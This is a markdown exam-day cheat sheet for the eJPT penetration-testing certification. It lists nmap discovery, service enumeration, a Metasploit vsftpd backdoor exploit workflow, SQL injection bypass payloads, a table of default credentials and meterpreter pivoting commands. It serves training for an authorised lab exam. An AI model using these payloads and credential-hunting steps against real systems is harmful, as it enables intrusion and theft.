# eJPT Cheat Sheets

Exam-day quick reference for the eLearnSecurity Junior Penetration Tester (eJPT) certification. Keep this open alongside the exam instructions and your note-taking tool.

---

## Exam-Day Reference

- **Format**: 48 hours, online VPN-based lab, 20 questions (multiple-choice and flag-based)
- **Passing score**: 70%
- **Proctoring**: Not proctored; open-book, open-internet
- **Retakes**: 1 free retake included with voucher

```bash
# Connect to the exam VPN
sudo openvpn exam.ovpn
```

Verify your tunnel IP before beginning:

```bash
ip a show tun0
```

---

## Network Discovery Workflow

1. Note your assigned IP range from the exam instructions
2. Host discovery sweep across the subnet
3. Service version scan on all live hosts
4. Full-port scan on interesting targets
5. Manual web browsing on every host with HTTP services

```bash
# Host discovery (ping sweep)
nmap -sn 192.168.X.0/24

# Quick service version scan across live hosts
nmap -sV --open 192.168.X.1-254

# Full scan on a specific interesting target
nmap -sV -sC -p- --open -oA scan_host_<IP> <IP>

# Always try browser on every host with web ports
# Ports to check: 80, 443, 8080, 8443, 8000, 8888
```

---

## Service Enumeration

### SMB

```bash
# Null session share listing
smbclient -L //<IP> -N
enum4linux-ng -A <IP>
crackmapexec smb <IP> --shares

# Connect to a specific share
smbclient //<IP>/sharename -N
```

### Web

```bash
# Directory brute force
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# Basic vulnerability scan
nikto -h http://<IP>

# Fingerprint the tech stack
whatweb http://<IP>
```

### FTP

```bash
# Check anonymous login
ftp <IP>
# username: anonymous
# password: anonymous

# Or use nmap script
nmap --script ftp-anon -p 21 <IP>
```

### SSH

```bash
# Banner grab for known CVEs
nc -vn <IP> 22
```

---

## Exploitation Workflows

### Metasploit Basics

```bash
# Launch and initialize
msfconsole

# Search for modules
search type:exploit name:vsftpd
search cve:2017-7494

# Use a module
use exploit/unix/ftp/vsftpd_234_backdoor

# Show and set options
show options
set RHOSTS <IP>
set LHOST <tun0-IP>
set LPORT 4444

# Run
run
# or
exploit
```

### SQL Injection — Key Test Payloads

```sql
' OR '1'='1
' OR '1'='1' --
admin' --
' UNION SELECT NULL,NULL,NULL--
```

### Default Credentials to Try

| Username | Password |
|----------|----------|
| admin | admin |
| admin | password |
| admin | (blank) |
| root | root |
| root | toor |
| tomcat | tomcat |
| manager | manager |

---

## Pivoting Basics

```bash
# On a compromised Linux host — list networks
ip a
route -n

# On a compromised Windows host
ipconfig /all
route print
```

```bash
# In a meterpreter session — add a route to the internal subnet
run autoroute -s 10.10.20.0/24

# Or via the post module
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.10.20.0
set NETMASK 255.255.255.0
run

# Now exploits and scans through the meterpreter session reach the internal subnet
```

---

## Common eJPT Gotchas

- **Always do full port scans** — services hiding on non-standard ports (8080, 8443, 9999) are a recurring eJPT pattern
- **Check every web application for login forms** — try default credentials before reaching for exploits
- **After getting a shell, check for additional networks** — run `ifconfig` / `ipconfig` immediately; dual-homed hosts are the key to the pivot questions
- **Read every file you find** — credentials often live in config files, readme notes, `.bash_history`, and home directories
- **Don't forget UDP** — some questions hinge on services like SNMP (161/udp)
- **Record flag values verbatim** — eJPT grading is strict on exact strings
- **Take notes per host** — the exam is long enough that you WILL forget which machine had which finding

---

**Last Updated**: 2026-04-14
**Version**: 1.0
